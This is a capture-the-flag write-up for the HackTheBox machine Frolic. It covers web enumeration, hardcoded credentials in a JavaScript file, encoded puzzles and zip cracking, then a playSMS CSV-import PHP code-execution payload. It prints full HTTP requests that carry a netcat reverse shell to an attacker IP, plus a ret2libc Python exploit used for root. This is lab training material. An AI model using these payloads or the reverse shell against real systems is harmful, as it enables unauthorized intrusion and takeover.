# Frolic

Frolic is a Linux machine that is rated as easy. This box privilege escalation is so awesome.

# Recon
Start with nmap scan:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ nmap -sC -sV 10.10.10.111
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-19 13:39 EDT
Nmap scan report for 10.10.10.111
Host is up (0.027s latency).
Not shown: 996 closed ports
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 87:7b:91:2a:0f:11:b6:57:1e:cb:9f:77:cf:35:e2:21 (RSA)
|   256 b7:9b:06:dd:c2:5e:28:44:78:41:1e:67:7d:1e:b7:62 (ECDSA)
|_  256 21:cf:16:6d:82:a4:30:c3:c6:9c:d7:38:ba:b5:02:b0 (ED25519)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
9999/tcp open  http        nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
Service Info: Host: FROLIC; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -1h47m03s, deviation: 3h10m31s, median: 2m56s
|_nbstat: NetBIOS name: FROLIC, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: frolic
|   NetBIOS computer name: FROLIC\x00
|   Domain name: \x00
|   FQDN: frolic
|_  System time: 2020-09-19T23:13:06+05:30
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-09-19T17:43:06
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
```

### SMB

So if you try to see what share files we have access on you can see that we have nothing:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ smbmap -H 10.10.10.111  
[+] Guest session       IP: 10.10.10.111:445    Name: 10.10.10.111                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        IPC$                                                    NO ACCESS       IPC Service (frolic server (Samba, Ubuntu))
```

## ffuf
Fuzzing...
```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/FUZZ         

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.111:9999/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

admin                   [Status: 301, Size: 194, Words: 7, Lines: 8]
test                    [Status: 301, Size: 194, Words: 7, Lines: 8]
dev                     [Status: 301, Size: 194, Words: 7, Lines: 8]
backup                  [Status: 301, Size: 194, Words: 7, Lines: 8]
loop                    [Status: 301, Size: 194, Words: 7, Lines: 8]
                        [Status: 200, Size: 637, Words: 79, Lines: 29]
```
So we have an ```/admin``` login page, let's enumerate more:

![image1]()

```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/admin/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.111:9999/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

css                     [Status: 301, Size: 194, Words: 7, Lines: 8]
js                      [Status: 301, Size: 194, Words: 7, Lines: 8]
```
And now we enumerate ```js```:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/admin/js/FUZZ.js

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.111:9999/admin/js/FUZZ.js
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

login                   [Status: 200, Size: 752, Words: 67, Lines: 24]
```
we can find some credentials in ```login.js```:
```
var attempt = 3; // Variable to count number of attempts.
// Below function Executes on click of login button.
function validate(){
var username = document.getElementById("username").value;
var password = document.getElementById("password").value;
if ( username == "admin" && password == "superduperlooperpassword_lol"){
alert ("Login successfully");
window.location = "success.html"; // Redirecting to other page.
return false;
}
else{
attempt --;// Decrementing by one.
alert("You have left "+attempt+" attempt;");
// Disabling fields after 3 attempts.
if( attempt == 0){
document.getElementById("username").disabled = true;
document.getElementById("password").disabled = true;
document.getElementById("submit").disabled = true;
return false;
}
}
}

```
credentials: **admin:superduperlooperpassword_lol**


After you login you will get some weird data:

![image2]()

So we can decrypt this ```ook``` code here: https://www.splitbrain.org/_static/ook/

![image3]()

So we get a new dir: ```/asdiSIAJJ0QWE9JAS```, and we find a base64 text:

![image4]()

We can decode it from here: https://base64.guru/converter/decode/file . And it is a protected zip file so we need to find the password for it. I will be using ```fcrackzip```:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ sudo fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u application.zip 


PASSWORD FOUND!!!!: pw == password
```
Unzip it:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ unzip application.zip 
Archive:  application.zip
[application.zip] index.php password: 
  inflating: index.php
```

and more work to do XD

```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ cat index.php 
4b7973724b7973674b7973724b7973675779302b4b7973674b7973724b7973674b79737250463067506973724b7973674b7934744c5330674c5330754b7973674b7973724b7973674c6a77720d0a4b7973675779302b4b7973674b7a78645069734b4b797375504373674b7974624c5434674c53307450463067506930744c5330674c5330754c5330674c5330744c5330674c6a77724b7973670d0a4b317374506973674b79737250463067506973724b793467504373724b3173674c5434744c53304b5046302b4c5330674c6a77724b7973675779302b4b7973674b7a7864506973674c6930740d0a4c533467504373724b3173674c5434744c5330675046302b4c5330674c5330744c533467504373724b7973675779302b4b7973674b7973385854344b4b7973754c6a776743673d3d0d0a
```
We need to conver it to hex an easy methode to do everything is using ```CyberChef```: https://gchq.github.io/CyberChef/

![image5]()

Now convert it from ```Base64```:

![image6]()

Another ```brainfuck``` language, use the first website that we used earlier and use to decode it from brainfuck to text:

![image7]()

So we have now this password:
```
idkwhatispass
```

If we fuzz ```/dev``` we find backup which refer to ```/playsms```
```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ ./ffuf -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -u http://10.10.10.111:9999/dev/FUZZ        

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.111:9999/dev/FUZZ
 :: Wordlist         : FUZZ: /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

test                    [Status: 200, Size: 5, Words: 1, Lines: 2]
backup                  [Status: 301, Size: 194, Words: 7, Lines: 8]
```

So if we go to ```/playsms``` we find a login page and the username and password is: **admin:idkwhatispass**

There is an exploit for it here: https://www.exploit-db.com/exploits/42044/ . So I created this file:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ cat exploit.csv 

Name,Mobile,Email,Group code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,
```
Go to **My Account** and select **Phonebook** then import the file:

![image8]()

So we need to capture the request with ```Burp``` and change the ```user-agent``` to the command that we wants to run:

```
POST /playsms/index.php?app=main&inc=feature_phonebook&route=import&op=import HTTP/1.1
Host: 10.10.10.111:9999
User-Agent: id
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list
Content-Type: multipart/form-data; boundary=---------------------------18737448642074461879922193212
Content-Length: 460
Connection: close
Cookie: PHPSESSID=dph6ircq4dahbekltfanch50q1
Upgrade-Insecure-Requests: 1

-----------------------------18737448642074461879922193212
Content-Disposition: form-data; name="X-CSRF-Token"

88224b584e80b00cfafb8793a9125d47
-----------------------------18737448642074461879922193212
Content-Disposition: form-data; name="fnpb"; filename="exploit.csv"
Content-Type: text/csv

Name,Mobile,Email,Group code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,

-----------------------------18737448642074461879922193212--

```

![image9]()

So if you forward the requests you will get the result:

![image10]()

So now to get a reverse shell :)

# User Flag

Put this revers shell to the **User-Agent** section: ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 4444 >/tmp/f```. And start a listener:
```
(pwncat-env) kali@kali:~/Desktop/pwncat$ pwncat --listen -p 4444
```

Forward the request:
```
POST /playsms/index.php?app=main&inc=feature_phonebook&route=import&op=import HTTP/1.1
Host: 10.10.10.111:9999
User-Agent: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.27 4444 >/tmp/f
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.10.111:9999/playsms/index.php?app=main&inc=feature_phonebook&route=import&op=list
Content-Type: multipart/form-data; boundary=---------------------------140166612519451329821966679799
Content-Length: 463
Connection: close
Cookie: PHPSESSID=dph6ircq4dahbekltfanch50q1
Upgrade-Insecure-Requests: 1

-----------------------------140166612519451329821966679799
Content-Disposition: form-data; name="X-CSRF-Token"

d170c0d60b942e9af79e3b9f7eb06778
-----------------------------140166612519451329821966679799
Content-Disposition: form-data; name="fnpb"; filename="exploit.csv"
Content-Type: text/csv

Name,Mobile,Email,Group code,Tags
<?php $t=$_SERVER['HTTP_USER_AGENT']; system($t); ?>,2,,,

-----------------------------140166612519451329821966679799--

```

And we got our shell:
```
(pwncat-env) kali@kali:~/Desktop/pwncat$ pwncat --listen -p 4444
[14:25:51] received connection from 10.10.10.111:49632                                                                                                                                                                       connect.py:148
[14:25:51] new host w/ hash a7ef9bd90edc64b01cf10bd9dab4c310                                                                                                                                                                  victim.py:325
[14:25:53] pwncat running in /bin/sh                                                                                                                                                                                          victim.py:358
[14:25:54] pwncat is ready 🐈                                                                                                                                                                                                 victim.py:768
                                                                                                                                                                                                                                           

(remote) www-data@frolic:/$ 
(remote) www-data@frolic:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Get the user flag:
```
(remote) www-data@frolic:/home/ayush$ cat user.txt
2ab95909...a0c2fe0
```

# Root Flag

So for root I can't realy explain how I did it in writing it here, but maybe I will make a video of explaining it.

Here is the exploit:
```
┌──(kali㉿kali)-[~/Desktop/HTB/Frolic]
└─$ cat exploit.py 
#!/usr/bin/python

import struct

buf = "A" * 52
sys = struct.pack("I" ,0xb7e53da0)
ex = struct.pack("I" ,0xb7e479d0)
shell = struct.pack("I" ,0xb7f74a0b)
print buf + sys + ex + shell
```

upload it to the Box and run it like here:

```
(remote) root@frolic:/home/ayush/.binary$ ./rop 'python /tmp/exploit.py'
[+] Message sent: python /tmp/exploit.py
(remote) root@frolic:/home/ayush/.binary$ id
uid=0(root) gid=33(www-data) groups=33(www-data)
```

We are root, get your root flag:

```
(remote) root@frolic:/root$ cat root.txt
85d3fdf0...1826222
```

Thank you for reading, and you can find me here on twitter: https://twitter.com/electronicbots
